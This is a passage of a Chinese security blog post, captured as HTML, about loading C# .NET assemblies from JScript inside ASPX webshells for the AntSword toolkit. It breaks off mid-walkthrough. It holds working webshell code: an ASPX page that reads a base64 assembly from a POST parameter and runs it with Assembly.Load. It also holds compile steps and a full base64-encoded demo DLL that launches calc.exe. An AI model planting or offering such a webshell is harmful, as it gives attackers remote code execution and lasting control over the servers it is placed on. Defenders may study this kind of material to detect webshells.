@@ -1,0 +1,552 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Jscript加载Assembly踩坑记 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="Jscript加载Assembly踩坑记" />
+<meta property="og:description" content="1 前言最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。 由于冰蝎跟哥斯拉都采用的C#类型的shell，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-27T16:03:47+00:00" />
+<meta property="article:modified_time" content="2021-01-27T16:03:47+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="Jscript加载Assembly踩坑记"/>
+<meta name="twitter:description" content="1 前言最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。 由于冰蝎跟哥斯拉都采用的C#类型的shell，"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" /><link rel="prev" href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/" /><link rel="next" href="https://yzddmr6.com/posts/make-usb-great-again/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Jscript加载Assembly踩坑记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/jscript-load-csharp-assembly\/"
+        },"genre": "posts","wordcount":  2562 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/jscript-load-csharp-assembly\/","datePublished": "2021-01-27T16:03:47+00:00","dateModified": "2021-01-27T16:03:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#理论支持">理论支持</a>
+      <ul>
+        <li><a href="#assembly">Assembly</a></li>
+        <li><a href="#从jscript到c">从Jscript到C#</a></li>
+      </ul>
+    </li>
+    <li><a href="#踩坑过程">踩坑过程</a></li>
+    <li><a href="#问题解决">问题解决</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Jscript加载Assembly踩坑记</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-27">2021-01-27</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-01-27">2021-01-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2562 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#理论支持">理论支持</a>
+      <ul>
+        <li><a href="#assembly">Assembly</a></li>
+        <li><a href="#从jscript到c">从Jscript到C#</a></li>
+      </ul>
+    </li>
+    <li><a href="#踩坑过程">踩坑过程</a></li>
+    <li><a href="#问题解决">问题解决</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。</p>
+<p>由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。</p>
+<p>但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。</p>
+<h2 id="理论支持" class="headerLink">
+    <a href="#%e7%90%86%e8%ae%ba%e6%94%af%e6%8c%81" class="header-mark"></a>2 理论支持</h2><h3 id="assembly" class="headerLink">
+    <a href="#assembly" class="header-mark"></a>2.1 Assembly</h3><p>这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：https://xz.aliyun.com/t/2758</p>
+<blockquote>
+<p>在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。</p>
+</blockquote>
+<p>java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。</p>
+<h3 id="从jscript到c" class="headerLink">
+    <a href="#%e4%bb%8ejscript%e5%88%b0c" class="header-mark"></a>2.2 从Jscript到C#</h3><p>蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？</p>
+<p>答案是可以的，这里附一张.net framework的框架图</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png" title="image" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure></p>
+<p>可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，都是在.net framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。</p>
+<p>那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。</p>
+<p>这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？</p>
+<p>其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。</p>
+<h2 id="踩坑过程" class="headerLink">
+    <a href="#%e8%b8%a9%e5%9d%91%e8%bf%87%e7%a8%8b" class="header-mark"></a>3 踩坑过程</h2><p>前面扯了这么多主要是理论，当然实现中没有这么顺利。</p>
+<p>首先新建一个Class Library项目，这里以弹计算器为例。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">using System.Diagnostics;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">namespace AntPayload
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public class Run
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        public override bool Equals(object obj)
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">            Process.Start(&#34;calc.exe&#34;);
+</span></span><span class="line"><span class="cl">            return true;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>项目自动编译或者手动编译为dll</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">csc /t:library AntPayload.cs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>base64一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base64 -w 0 AntPayload.dll &gt; AntPayload.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEO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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新建web项目，建立test.aspx测试一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    var Payload =Request.Form(&#34;data&#34;);
+</span></span><span class="line"><span class="cl">    var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+</span></span><span class="line"><span class="cl">    var myPaylaod=myAssebly.CreateInstance(&#34;AntPayload.Run&#34;).Equals(this);
+</span></span><span class="line"><span class="cl">    myPaylaod.Equals(this);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POST：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data=xxxx(上文中的payload)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png"
